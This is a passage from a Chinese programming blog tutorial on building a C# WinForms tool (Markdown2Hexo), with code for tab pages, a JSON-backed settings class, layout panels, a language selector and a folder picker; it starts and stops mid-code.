&#123;</span><br><span class="line">            <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">            <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">                tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">            TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">            &#123;</span><br><span class="line">                Name = tabName</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 给 TabPage 添加内容</span></span><br><span class="line">            Label label = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">$&quot;<span class="subst">&#123;tabName&#125;</span> Content&quot;</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleCenter</span><br><span class="line">            &#125;;</span><br><span class="line">            newTab.Controls.Add(label);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">            tabControl.TabPages.Add(newTab);</span><br><span class="line">            tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.Designer.cs</span></span><br><span class="line">...</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitializeCustomComponents</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TabControl</span></span><br><span class="line">            tabControl = <span class="keyword">new</span> TabControl();</span><br><span class="line">            tabControl.Dock = DockStyle.Fill;  <span class="comment">// 将 TabControl 填充整个窗体</span></span><br><span class="line">            <span class="keyword">this</span>.Controls.Add(tabControl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>此时我们点击Settings就可以更改主窗口的显示了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125160006519.png"
                      class=""
                >
<h4 id="设置界面实现"><a href="#设置界面实现" class="headerlink" title="设置界面实现"></a>设置界面实现</h4><p>这里由于settings是一块单独的逻辑设置，我们可以将其提取为一个单独的类，并且使用json来管理设置项。那么我们之后在主程序中要用到设置的内容时，只需要示例化设置对象并读取对应属性即可。而且可以在这个类中实现每一条配置的面板（包括标签与输入框或选项框）的返回。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SettingsData</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Settings</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// 语言选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// 主题选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;       <span class="comment">// Hexo 目录路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> settingsFilePath = <span class="string">&quot;settings.json&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> SettingsData settingsData;</span><br><span class="line">        <span class="keyword">public</span> ComboBox optionLanguage &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 多选框控件</span></span><br><span class="line">        <span class="keyword">public</span> TextBox hexoDirectoryTextBox &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;   <span class="comment">// 文本框控件</span></span><br><span class="line">        <span class="keyword">public</span> Button browseButton &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 按钮控件</span></span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Settings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (File.Exists(settingsFilePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> json = File.ReadAllText(settingsFilePath);</span><br><span class="line">                <span class="keyword">var</span> settings = JsonConvert.DeserializeObject&lt;Settings&gt;(json);</span><br><span class="line">                <span class="keyword">this</span>.Language = settings.Language;</span><br><span class="line">                <span class="keyword">this</span>.SelectedTheme = settings.SelectedTheme;</span><br><span class="line">                <span class="keyword">this</span>.HexoDirectory = settings.HexoDirectory;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SaveSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建一个新的对象，只包含需要序列化的设置项</span></span><br><span class="line">            settingsData = <span class="keyword">new</span> SettingsData</span><br><span class="line">            &#123;</span><br><span class="line">                Language = <span class="keyword">this</span>.Language,</span><br><span class="line">                SelectedTheme = <span class="keyword">this</span>.SelectedTheme,</span><br><span class="line">                HexoDirectory = <span class="keyword">this</span>.HexoDirectory</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> json = JsonConvert.SerializeObject(settingsData, Formatting.Indented);</span><br><span class="line">            File.WriteAllText(settingsFilePath, json);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里我们设置<strong>SettingsData</strong>这个类的原因在于后面保存设置时，如果直接把<strong>Settings</strong>这个含有各个控件的类进行序列化，会遇到一个自引用循环。具体来说，<code>ComboBox</code> 控件中的某些属性（例如 <code>AccessibilityObject</code>）可能包含对该控件本身的引用，导致在序列化时发生死循环。所以这里我们把其设置属性全部提取到<strong>SettingsData</strong>来避免上述错误发生。</p>
<p>需要注意的是，settings.js的输出目录为<strong>projectdir/bin/Debug/settings.json</strong>，我们如果需要手动赋个初值，也需要在这个目录下创建，而不是直接用visual studio的创建文件功能。</p>
<h5 id="布局设计"><a href="#布局设计" class="headerlink" title="布局设计"></a>布局设计</h5><p>由于我们有很多选项需要显示在窗口中，所以我们要利用<strong>TableLayoutPanel</strong>、<strong>FlowLayoutPanel</strong>等布局控件来优化布局，不然一个一个设置坐标，还要想办法根据屏幕尺寸自适应，会相当麻烦。进阶一点可以使用 <strong>GroupBox</strong> 或者 <strong>TabControl</strong> 来进行更细化的分组。这里我们目前需要的选项较少，就先只用<strong>TableLayoutPanel</strong>进行布局。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">    <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">        tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">    TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        Name = tabName</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 布局设计</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        RowCount = <span class="number">5</span>, <span class="comment">// 设置行数，根据实际需要调整</span></span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 设置列数，通常是 2 列</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据选中的菜单来切换视图</span></span><br><span class="line">    <span class="keyword">switch</span> (tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Help&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">            settings.LoadSettings();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Plugins&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">    tabControl.TabPages.Add(newTab);</span><br><span class="line">    tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的<strong>OptionLanguageComboBox</strong>方法我们在下文中会给出具体实现。</p>
<h5 id="语言切换功能"><a href="#语言切换功能" class="headerlink" title="语言切换功能"></a>语言切换功能</h5><p>目的是能够支持中文和英文两种语言。这里我们打算在 <code>Settings</code> 的 <code>TabPage</code> 中渲染一个选项条，点击后展示待选项，并且实现鼠标悬停时高亮显示选项。</p>
<p>在Settings.cs中加入如下几个方法：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateLanguageSetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 创建两列，第一列放 Label，第二列放 ComboBox</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度比例</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); </span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); </span><br><span class="line"></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Language&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft,  <span class="comment">// 设置文字在 Label 中垂直和水平居中</span></span><br><span class="line">        Dock = DockStyle.Fill  <span class="comment">// 使 Label 填满单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage = <span class="keyword">new</span> ComboBox</span><br><span class="line">    &#123;</span><br><span class="line">        Name = <span class="string">&quot;Language&quot;</span>, <span class="comment">// 设置 Name</span></span><br><span class="line">        DropDownStyle = ComboBoxStyle.DropDownList,</span><br><span class="line">        Width = <span class="number">200</span>,</span><br><span class="line">        Location = <span class="keyword">new</span> Point(<span class="number">30</span>, <span class="number">50</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;zh&quot;</span>);</span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;en&quot;</span>);</span><br><span class="line">    <span class="built_in">int</span> index = optionLanguage.Items.IndexOf(Language);</span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">        optionLanguage.SelectedIndex = index;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optionLanguage.SelectedIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    optionLanguage.SelectedIndexChanged += ComboBox_SelectedIndexChanged;</span><br><span class="line"></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1);</span><br><span class="line">    tableLayoutPanel.Controls.Add(optionLanguage);</span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ComboBox 的选项变化事件处理方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ComboBox_SelectedIndexChanged</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 将 sender 强制转换为 ComboBox，以便访问其属性</span></span><br><span class="line">    ComboBox comboBox = sender <span class="keyword">as</span> ComboBox;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (comboBox != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取选中的索引</span></span><br><span class="line">        <span class="built_in">int</span> selectedIndex = comboBox.SelectedIndex;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示相应的多选框面板</span></span><br><span class="line">        ChangeAndSave(selectedIndex, comboBox.Name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法：切换选项并保存设置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ChangeAndSave</span>(<span class="params"><span class="built_in">int</span> selectedIndex, <span class="built_in">string</span> settingType</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (settingType)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Language&quot;</span>:</span><br><span class="line">            <span class="comment">// MessageBox.Show($&quot;选项已设置：&quot; + optionLanguage.Items[selectedIndex].ToString());</span></span><br><span class="line">            <span class="keyword">this</span>.Language = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;SelectedTheme&quot;</span>:</span><br><span class="line">            <span class="keyword">this</span>.SelectedTheme = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存到文件</span></span><br><span class="line">    SaveSettings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里内部也是使用<strong>TableLayoutPanel</strong>进行布局，可以通过<strong>ColumnStyles</strong>设置列宽度，从而在一行中对标签以及选项框进行布局</p>
<p>可以看到已经成功的渲染出了选项标签与选择框。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127003008032.png"
                      class=""
                >
<h5 id="Hexo目录设置"><a href="#Hexo目录设置" class="headerlink" title="Hexo目录设置"></a>Hexo目录设置</h5><div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateHexoDirectorySetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">3</span>, <span class="comment">// 创建三列，第一列放 Label，第二列放 TextBox，第三列放 Button</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度（比例为 2:5:1）</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第一列：20%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); <span class="comment">// 第二列：60%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第三列：20%</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建提示文字</span></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Hexo Directory&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft, <span class="comment">// 使文字左对齐</span></span><br><span class="line">        Dock = DockStyle.Fill <span class="comment">// 使 Label 填充其所在的单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建文本框</span></span><br><span class="line">    hexoDirectoryTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="keyword">this</span>.HexoDirectory, <span class="comment">// 显示已有的 Hexo 目录路径</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建浏览按钮</span></span><br><span class="line">    browseButton = <span class="keyword">new</span> Button</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Browse&quot;</span>,</span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浏览按钮点击事件</span></span><br><span class="line">    browseButton.Click += BrowseButton_Click;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将控件添加到 TableLayoutPanel 中</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 添加 Label 到第一列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(hexoDirectoryTextBox, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">// 添加 TextBox 到第二列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(browseButton, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// 添加 Button 到第三列</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浏览按钮点击事件处理</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BrowseButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (FolderBrowserDialog folderDialog = <span class="keyword">new</span> FolderBrowserDialog())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置初始文件夹路径为当前路径</span></span><br><span class="line">        folderDialog.SelectedPath = hexoDirectoryTextBox.Text;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 弹出文件夹选择框</span></span><br><span class="line">        <span class="keyword">if</span> (folderDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置 TextBox 为选择的文件夹路径</span></span><br><span class="line">            MessageBox.Show(<span class="string">&quot;Hexo directory has been set to &quot;</span> + folderDialog.SelectedPath);</span><br><span class="line">            hexoDirectoryTextBox.Text = folderDialog.SelectedPath;</span><br><span class="line">            HexoDirectory = folderDialog.SelectedPath;</span><br><span class="line">        &#125;</span><br><span class="line">        SaveSettings();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户输入的路径是否有效</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ValidateHexoDirectory</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> path = hexoDirectoryTextBox.Text;</span><br><span class="line">    <span class="keyword">if</span> (Directory.Exists(path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.HexoDirectory = path;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 路径有效</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Invalid Hexo directory. Please select a valid path.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 路径无效</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>选文件路径是用<strong>folderDialog</strong>，类似于之前可视化文件选取所用到的<strong>OpenFileDialog</strong>。这里我们也是返回一个<strong>tableLayoutPanel</strong>到主程序，然后再在主程序中将其增加到对应的设计面板<strong>tableLayoutPanel</strong>中，最后主程序把设计面板加入<strong>Settings</strong>的<strong>TabPage</strong>即可。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">    settings.LoadSettings();</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127225711667.png"
                      class=""
                >
<h4 id="文件格式转换功能实现"><a href="#文件格式转换功能实现" class="headerlink" title="文件格式转换功能实现"></a>文件格式转换功能实现</h4><p>前面我们已经解决了获取输入文件路径以及输出目录的问题，然后我们就可以着手实现我们的核心功能，也就是图片文件转移与输出目标格式文件。这里我们还可以可视化实现hexo文章标签与类别的设置。以下是整个<strong>FileProcessor.cs</strong>的实现。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Tag &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// Hexo文章标签</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;  <span class="comment">// Hexo文章标题</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Category &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// Hexo文章分类</span></span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel tagsPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addTagButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeTagButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; tagsTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel categoriesPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; categoriesTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> RichTextBox processInfoBox;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//渲染Process Markdown面板</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Control <span class="title">CreateProcessMarkdownPanel</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TableLayoutPanel 用于布局</span></span><br><span class="line">            TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                RowCount = <span class="number">6</span>, <span class="comment">// 根据需要的行数调整</span></span><br><span class="line">                ColumnCount = <span class="number">2</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">20</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>));</span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">80</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建文件路径标签</span></span><br><span class="line">            Label filePathLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Source File Path: &quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Label filePathValueLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = filePath,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft,</span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">10</span>),</span><br><span 